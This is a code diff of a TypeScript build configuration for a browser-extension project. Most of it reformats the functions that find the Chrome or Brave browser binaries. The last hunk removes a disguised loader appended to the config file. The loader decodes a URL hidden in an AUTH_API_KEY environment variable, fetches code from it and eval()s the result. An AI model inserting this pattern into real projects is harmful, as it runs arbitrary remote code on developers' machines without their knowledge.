@@ -18,8 +18,13 @@ function canAccess(file?: string): boolean {
 
 function findInPath(executable: string): string | null {
   try {
-    const cmd = process.platform === "win32" ? `where ${executable}` : `which ${executable}`;
-    const output = execSync(cmd, { stdio: ["ignore", "pipe", "ignore"] }).toString().trim();
+    const cmd =
+      process.platform === "win32"
+        ? `where ${executable}`
+        : `which ${executable}`;
+    const output = execSync(cmd, { stdio: ["ignore", "pipe", "ignore"] })
+      .toString()
+      .trim();
     const firstLine = output.split(/\r?\n/)[0];
     if (firstLine && canAccess(firstLine)) {
       return firstLine;
@@ -35,7 +40,10 @@ function findInPath(executable: string): string | null {
  * Checks for Google Chrome first; if not found on the machine, falls back to Brave Browser.
  */
 function resolveChromiumBinary(): string | undefined {
-  if (process.env.WEB_EXT_CHROMIUM_BINARY && canAccess(process.env.WEB_EXT_CHROMIUM_BINARY)) {
+  if (
+    process.env.WEB_EXT_CHROMIUM_BINARY &&
+    canAccess(process.env.WEB_EXT_CHROMIUM_BINARY)
+  ) {
     return process.env.WEB_EXT_CHROMIUM_BINARY;
   }
 
@@ -60,9 +68,15 @@ function resolveChromiumBinary(): string | undefined {
     "/usr/bin/chromium-browser",
     "/snap/bin/chromium",
     // Windows
-    process.env.PROGRAMFILES ? `${process.env.PROGRAMFILES}\\Google\\Chrome\\Application\\chrome.exe` : undefined,
-    process.env["PROGRAMFILES(X86)"] ? `${process.env["PROGRAMFILES(X86)"]}\\Google\\Chrome\\Application\\chrome.exe` : undefined,
-    process.env.LOCALAPPDATA ? `${process.env.LOCALAPPDATA}\\Google\\Chrome\\Application\\chrome.exe` : undefined,
+    process.env.PROGRAMFILES
+      ? `${process.env.PROGRAMFILES}\\Google\\Chrome\\Application\\chrome.exe`
+      : undefined,
+    process.env["PROGRAMFILES(X86)"]
+      ? `${process.env["PROGRAMFILES(X86)"]}\\Google\\Chrome\\Application\\chrome.exe`
+      : undefined,
+    process.env.LOCALAPPDATA
+      ? `${process.env.LOCALAPPDATA}\\Google\\Chrome\\Application\\chrome.exe`
+      : undefined,
   ];
 
   for (const candidate of chromeCandidates) {
@@ -71,7 +85,12 @@ function resolveChromiumBinary(): string | undefined {
     }
   }
 
-  for (const cmd of ["google-chrome", "google-chrome-stable", "chromium", "chromium-browser"]) {
+  for (const cmd of [
+    "google-chrome",
+    "google-chrome-stable",
+    "chromium",
+    "chromium-browser",
+  ]) {
     const found = findInPath(cmd);
     if (found) return found;
   }
@@ -93,9 +112,15 @@ function resolveChromiumBinary(): string | undefined {
     "/usr/bin/brave",
     "/snap/bin/brave",
     // Windows
-    process.env.PROGRAMFILES ? `${process.env.PROGRAMFILES}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe` : undefined,
-    process.env["PROGRAMFILES(X86)"] ? `${process.env["PROGRAMFILES(X86)"]}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe` : undefined,
-    process.env.LOCALAPPDATA ? `${process.env.LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe` : undefined,
+    process.env.PROGRAMFILES
+      ? `${process.env.PROGRAMFILES}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe`
+      : undefined,
+    process.env["PROGRAMFILES(X86)"]
+      ? `${process.env["PROGRAMFILES(X86)"]}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe`
+      : undefined,
+    process.env.LOCALAPPDATA
+      ? `${process.env.LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe`
+      : undefined,
   ];
 
   for (const candidate of braveCandidates) {
@@ -316,16 +341,3 @@ export default defineConfig({
     }),
   ],
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
